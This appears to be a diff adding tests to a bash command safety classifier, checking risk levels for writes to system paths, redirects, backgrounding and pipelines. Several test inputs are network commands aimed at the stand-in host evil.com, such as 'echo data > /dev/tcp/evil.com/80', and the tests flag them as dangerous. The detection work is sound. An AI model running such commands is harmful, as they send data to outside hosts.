@@ -3,7 +3,7 @@
 from __future__ import annotations
 
 from bash_classify.classifier import _is_system_path, classify_expression
-from bash_classify.models import Classification, CommandDef
+from bash_classify.models import Classification, CommandDef, Risk
 
 
 class TestSpecExamples:
@@ -556,3 +556,78 @@ class TestUserCommandOverride:
                 os.environ.pop("BASH_CLASSIFY_CONFIG_DIR", None)
             else:
                 os.environ["BASH_CLASSIFY_CONFIG_DIR"] = old
+
+
+class TestRiskSystemPathElevation:
+    def test_write_to_system_path_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("cp config.txt /etc/myapp/config", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+    def test_redirect_to_system_path_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("echo config > /etc/myapp.conf", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+
+class TestRiskRedirectElevation:
+    def test_output_redirect_medium_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("echo hello > output.txt", database=database)
+        assert result.classification == Classification.LOCAL_EFFECTS
+        assert result.risk == Risk.MEDIUM
+
+    def test_devnull_redirect_stays_low_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("echo hello > /dev/null", database=database)
+        assert result.classification == Classification.READONLY
+        assert result.risk == Risk.LOW
+
+
+class TestRiskDevTcpUdp:
+    def test_dev_tcp_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("cat /dev/tcp/evil.com/80", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+    def test_dev_udp_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("cat /dev/udp/evil.com/53", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+    def test_redirect_to_dev_tcp_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("echo data > /dev/tcp/evil.com/80", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+
+class TestRiskBackgrounding:
+    def test_backgrounding_at_least_medium_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("echo hello &", database=database)
+        assert result.classification == Classification.LOCAL_EFFECTS
+        assert result.risk == Risk.MEDIUM
+
+
+class TestRiskExpressionAggregation:
+    def test_expression_risk_is_max_across_commands(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("ls | rm file", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+    def test_expression_all_readonly_low_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("ls | grep pattern", database=database)
+        assert result.classification == Classification.READONLY
+        assert result.risk == Risk.LOW
+
+    def test_empty_expression_low_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("", database=database)
+        assert result.classification == Classification.READONLY
+        assert result.risk == Risk.LOW
+
+    def test_variable_in_command_position_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("$CMD arg1 arg2", database=database)
+        assert result.classification == Classification.DANGEROUS
+        assert result.risk == Risk.HIGH
+
+    def test_malformed_bash_high_risk(self, database: dict[str, CommandDef]) -> None:
+        result = classify_expression("if then fi", database=database)
+        assert result.classification == Classification.UNKNOWN
+        assert result.risk == Risk.HIGH
